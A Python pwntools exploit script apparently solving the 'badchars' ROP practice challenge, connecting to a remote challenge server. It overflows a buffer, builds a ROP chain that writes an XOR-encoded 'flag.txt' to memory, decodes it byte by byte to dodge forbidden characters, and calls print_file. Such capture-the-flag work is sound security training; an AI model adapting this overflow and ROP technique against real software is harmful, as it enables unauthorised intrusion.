from pwn import *

elf = context.binary = ELF('./badchars')
libc = ELF('./libbadchars.so')
proc = remote('vunrotc.cole-ellis.com', 5500)

v_junk 				= 0x4343434343434343
a_writeLoc 			= 0x601038		# location to store a string

f_printfile 		= 0x400510

g_ret 				= 0x400589
g_popRdi 			= 0x4006a3		# pop rdi ; ret
g_popR12R13R14R15	= 0x40069c		# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
g_writeR12AtR13 	= 0x400634 		# mov qword ptr [r13], r12 ; ret
g_xor1514 			= 0x400628		# xor byte ptr [r15], r14b ; ret
g_popR15 			= 0x4006a2		# pop r15; ret;

# XOR flag with 0x2 to avoid the badchars
flag = bytes([b ^ 0x2 for b in b'flag.txt'])

padding = b'A' * 40
ropChain = b''

# align the stack
ropChain += p64(g_ret)

# load registers (r12=flag, r13=writeLoc, r14=0x2, r15=v_junk)
ropChain += p64(g_popR12R13R14R15)
ropChain += flag
ropChain += p64(a_writeLoc)
ropChain += p64(0x2)
ropChain += p64(v_junk)

# store flag in writeLoc
ropChain += p64(g_writeR12AtR13)

# xor each byte of flag with 0x2
for i in range(8):
	ropChain += p64(g_popR15)
	ropChain += p64(a_writeLoc + i)
	ropChain += p64(g_xor1514)

# call print_file with writeLoc
ropChain += p64(g_popRdi)
ropChain += p64(a_writeLoc)
ropChain += p64(f_printfile)

print(proc.readuntil(b'> '))
proc.send(padding + ropChain)
proc.interactive()
